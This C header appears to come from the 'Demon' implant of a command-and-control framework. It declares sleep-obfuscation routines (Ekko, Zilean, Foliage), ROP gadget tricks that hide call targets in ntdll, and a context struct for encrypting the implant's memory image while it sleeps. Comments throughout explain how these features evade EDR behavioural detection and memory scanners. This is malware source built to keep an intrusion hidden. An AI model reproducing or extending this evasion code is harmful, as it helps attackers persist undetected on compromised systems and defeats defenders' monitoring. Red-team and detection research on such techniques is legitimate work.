
#ifndef DEMON_SLEEPOBF_H
#define DEMON_SLEEPOBF_H

#include <windows.h>

#define SLEEPOBF_NO_OBF     0x0
#define SLEEPOBF_EKKO       0x1
#define SLEEPOBF_ZILEAN     0x2
#define SLEEPOBF_FOLIAGE    0x3
#define SLEEPOBF_LEGITIMATE 0x4

#define SLEEPOBF_BYPASS_NONE 0
#define SLEEPOBF_BYPASS_JMPRAX 0x1
#define SLEEPOBF_BYPASS_JMPRBX 0x2

/* Memory encryption threshold (milliseconds).
 * Below this, skip VirtualProtect + SystemFunction032 and use stack-spoof-only.
 * Prevents behavioral detection from rapid memory protection cycling.
 * Covers: SMB idle polling (500ms), "sleep 0" clamped (500ms), short intervals.
 * At 500ms intervals, VirtualProtect cycling creates a metronome pattern
 * detectable by EDR behavioral ML. The brief exposure window is negligible
 * for memory scanners which don't run at sub-second intervals. */
#define SLEEPOBF_ENCRYPT_THRESHOLD 1500

/* OBF_JMP: Set ROP entry's execution target based on the configured JMP bypass method.
 * JMPRAX: Rip → jmp-rax gadget in ntdll, Rax → target function (hides real target from call stack)
 * JMPRBX: Rip → jmp-[rbx] gadget in ntdll, Rbx → address of function pointer (double indirection)
 * NONE:   Rip → target function directly (no gadget, simplest but most visible) */
#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {         \
        Rop[ i ].Rax = U_PTR( p );                       \
    } else if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[ i ].Rbx = U_PTR( & p );                     \
    } else {                                             \
        Rop[ i ].Rip = U_PTR( p );                       \
    }

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;

/* Context struct passed to the external sleep callback stub.
 * The stub lives outside the agent image (survives encryption) and
 * calls APIs directly via these function pointers — NO NtContinue,
 * NO ROP chain, NO thread pool state corruption.
 *
 * Layout must match the x64 shellcode offsets exactly. */
typedef struct _SLEEP_CALLBACK_CTX {
    PVOID           pfnVirtualProtect;       /* +0x00 */
    PVOID           pfnSystemFunction032;    /* +0x08 */
    PVOID           pfnWaitForSingleObjectEx;/* +0x10 */
    PVOID           pfnNtSetEvent;           /* +0x18 */
    PVOID           ImgBase;                 /* +0x20 */
    SIZE_T          ImgSize;                 /* +0x28 */
    PVOID           TxtBase;                 /* +0x30 */
    SIZE_T          TxtSize;                 /* +0x38 */
    DWORD           TxtProtect;              /* +0x40 */
    DWORD           _pad1;                   /* +0x44: align */
    PVOID           pOldProtect;             /* +0x48: &Value (DWORD on caller stack) */
    PVOID           pImgUstring;             /* +0x50: &Img USTRING */
    PVOID           pKeyUstring;             /* +0x58: &Key USTRING */
    HANDLE          WaitHandle;              /* +0x60: event/pipe or dummy for timeout */
    DWORD           Timeout;                 /* +0x68: sleep duration ms */
    DWORD           _pad2;                   /* +0x6C: align */
    HANDLE          EvntDone;                /* +0x70: completion event */
    volatile DWORD* SleepingFlag;            /* +0x78: VEH trampoline flag */
} SLEEP_CALLBACK_CTX, *PSLEEP_CALLBACK_CTX;

typedef struct _SLEEP_PARAM
{
    UINT32  TimeOut;
    PVOID   Master;
    PVOID   Slave;
    HANDLE  WaitHandle;  /* optional event to wait on instead of thread handle (for overlapped I/O) */
} SLEEP_PARAM, *PSLEEP_PARAM;

BOOL LegitimateObf( IN DWORD TimeOut );
VOID SleepObf( );
VOID SleepObfEx( HANDLE WaitHandle, DWORD TimeOut );

#endif